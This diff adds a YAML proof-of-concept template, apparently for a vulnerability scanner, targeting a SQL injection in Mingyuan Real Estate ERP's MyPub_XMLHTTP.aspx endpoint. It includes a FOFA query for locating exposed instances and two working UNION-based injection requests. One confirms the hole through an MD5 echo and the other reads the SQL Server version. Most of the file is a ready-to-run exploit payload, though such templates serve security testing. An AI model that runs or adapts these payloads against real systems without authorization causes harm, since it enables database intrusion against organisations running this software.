@@ -1,0 +1,19 @@
+id: poc-yaml-mingyuanyun-erp-mypub-xmlhttp-aspx-sqli
+info:
+  name: 明源地产ERP MyPub_XMLHTTP.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 明源云ERP
+  fofa: app="明源云-ERP"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /Sldzkp/DZKP/MyPub_XMLHTTP.aspx/?ywtype=GETPRINTVAL&rptid=1%27+UNION+ALL+SELECT+NULL%2Csys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))%2CNULL%2CNULL--
+  expression: status_code == 200 && body == "0x" + t2
+- method: GET
+  path: /Sldzkp/DZKP/MyPub_XMLHTTP.aspx/?ywtype=GETPRINTVAL&rptid=1%27+UNION+ALL+SELECT+NULL%2C@@version%2CNULL%2CNULL--
+  expression: status_code == 200 && contains(body,"Microsoft SQL Server")
+transport: http
